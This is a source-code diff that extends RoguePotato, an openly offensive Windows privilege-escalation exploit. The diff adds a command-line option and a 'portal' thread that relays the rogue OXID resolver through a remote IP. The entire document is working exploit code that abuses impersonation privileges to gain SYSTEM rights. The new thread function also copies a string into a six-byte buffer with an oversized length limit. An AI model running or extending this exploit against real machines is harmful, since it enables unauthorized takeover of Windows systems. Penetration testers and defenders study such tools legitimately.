@@ -8,6 +8,8 @@
 
 //global variables
 wchar_t* remote_ip;
+wchar_t* listening_port = NULL;
+char target_resolver_local_port[256];
 wchar_t* commandline = NULL;
 wchar_t* clsid_string;
 char gPipeName[MAX_PATH];
@@ -16,6 +18,7 @@ wchar_t WinStationName[256];
 //functions
 void GenRandomString(char* s, const int len);
 DWORD WINAPI ThreadOxid(LPVOID lpParam);
+DWORD WINAPI ThreadPortal(LPVOID lpParam);
 void SetWinDesktopPerms();
 
 
@@ -23,7 +26,7 @@ int wmain(int argc, wchar_t** argv)
 {
 	//init default values
 	wchar_t default_clsid[] = L"{4991d34b-80a1-4291-83b6-3328366b9097}";
-	wchar_t* listening_port = NULL;
+	wchar_t* portal_port = NULL;
 	wchar_t* pipe_placeholder = (wchar_t*)PIPE_NAME;
 	
 	remote_ip = NULL;
@@ -49,6 +52,12 @@ int wmain(int argc, wchar_t** argv)
 			++argv;
 			--argc;
 			listening_port = argv[1];
+			break;
+
+		case 'b':
+			++argv;
+			--argc;
+			portal_port = argv[1];
 			break;
 
 		case 'c':
@@ -92,12 +101,13 @@ int wmain(int argc, wchar_t** argv)
 	
 	
 	printf("[+] Starting RoguePotato...\n");
-	RoguePotato(commandline, pipe_placeholder, listening_port);
+	RoguePotato(commandline, pipe_placeholder, listening_port, portal_port);
 	return 0;
 }
 
-void RoguePotato(wchar_t *commandline, wchar_t *pipe_placeholder, wchar_t *listening_port) {
+void RoguePotato(wchar_t *commandline, wchar_t *pipe_placeholder, wchar_t *listening_port, wchar_t* portal_port) {
 	DWORD threadId;
+	DWORD portalThreadId;
 	wchar_t pipename[MAX_PATH];
 	if (!EnablePriv(NULL, SE_IMPERSONATE_NAME))
 	{
@@ -107,13 +117,21 @@ void RoguePotato(wchar_t *commandline, wchar_t *pipe_placeholder, wchar_t *liste
 	
 	SetWinDesktopPerms();
 
+	if (portal_port != NULL && listening_port == NULL) {
+		listening_port = (wchar_t*)DEFAULT_RESOLVER_LISTENING_PORT;
+	}
+
 	if (listening_port != NULL) {
 		printf("[*] Creating Rogue OXID resolver thread\n");
+		snprintf(target_resolver_local_port, 255, "%ws", listening_port);
 		CreateThread(NULL, 0, ThreadOxid, (LPVOID)listening_port, 0, &threadId);
 	}
 	else
 		printf("[!] RogueOxidResolver not run locally. Ensure you run it on your remote machine\n");
-	
+
+	if (portal_port != NULL) {
+		CreateThread(NULL, 0, ThreadPortal, (LPVOID)portal_port, 0, &portalThreadId);
+	}
 	if(pipe_placeholder == NULL)
 		GenRandomString(gPipeName, 10);
 	else
@@ -205,6 +223,14 @@ void GenRandomString(char* s, const int len)
 	}
 
 	s[len] = 0;
+}
+
+DWORD WINAPI ThreadPortal(LPVOID lpParam)
+{
+	char portal_port[6];
+	wcstombs(portal_port, (const wchar_t*)lpParam, MAX_PATH - 1);
+	RunPortalController(portal_port, remote_ip, target_resolver_local_port);
+	return 0;
 }
 
 DWORD WINAPI ThreadOxid(LPVOID lpParam)
